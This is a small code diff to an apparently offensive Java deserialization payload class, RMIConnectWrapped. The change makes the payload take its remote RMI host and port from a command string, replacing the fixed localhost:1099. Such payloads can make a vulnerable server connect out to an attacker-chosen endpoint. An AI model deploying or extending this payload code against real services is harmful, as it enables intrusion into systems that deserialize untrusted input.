@@ -32,8 +32,9 @@ public class RMIConnectWrapped extends Payload<Remote> {
     @Override
     public Bullet getDefaultBullet(String command) throws Exception {
         Bullet bullet = new RMIConnectBullet();
-        bullet.set("rhost","localhost");
-        bullet.set("rport","1099");
+        String[] url = command.split(":");
+        bullet.set("rhost", url[0]);
+        bullet.set("rport", url[1]);
         return bullet;
     }
 
